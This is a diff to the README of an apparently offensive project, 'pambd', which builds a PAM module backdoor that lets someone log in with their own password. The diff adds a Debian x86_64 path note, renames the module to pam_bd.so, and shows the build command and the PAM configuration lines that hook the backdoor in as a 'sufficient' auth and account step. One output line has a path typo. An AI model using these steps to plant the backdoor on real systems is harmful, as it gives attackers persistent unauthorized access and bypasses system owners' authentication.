@@ -4,6 +4,11 @@ pambd
 Introduction
 ------------
 
+Note: the software in this repository is targeted at x86_64 Debian Linux
+running a normal Linux kernel. As a result, some paths and configurations
+will be different on other distributions of Linux. Adjust the gen.sh bash
+script appropriately.
+
 This trick shows you how to create a PAM module backdoor that 
 allows to execute an user login with your own custom password.
 
@@ -40,7 +45,7 @@ After that, generate the pam backdoor with:
 deftcode pambd $ sudo sh gen.sh
 ```
 
-This will generate the pam backdoor at **/lib/security/pambd.so**.
+This will generate the pam backdoor at **/lib/x86_64-linux-gnu/security/pam_bd.so**.
 
 
 Configure the PAM service you want to hijack
@@ -53,8 +58,8 @@ nauth           sufficient      pam_rootok.so
 auth            sufficient      pam_unix.so     # This must be 'sufficient'.
 account         required        pam_unix.so
 session         required        pam_unix.so
-auth            sufficient      pambd.so        # This is our pam backdoor.
-account         sufficient      pambd.so        # --
+auth            sufficient      pam_bd.so        # This is our pam backdoor.
+account         sufficient      pam_bd.so        # --
 ```
 
 
@@ -64,8 +69,8 @@ Test the backdoor
 After you have created the pambd backdoor, you can test It.
 
 ```bash
-deftcode pambd $ file /lib/security/pambd.so 
-/lib/security/pambd.so: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked, not stripped
+deftcode pambd $ file /lib/x86_64-linux-gnu/security/pam_bd.so 
+/lib/x86_64-linux_gnu/security/pam_bd.so: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked, not stripped
 ```
 
 Example with the **SSH** service:
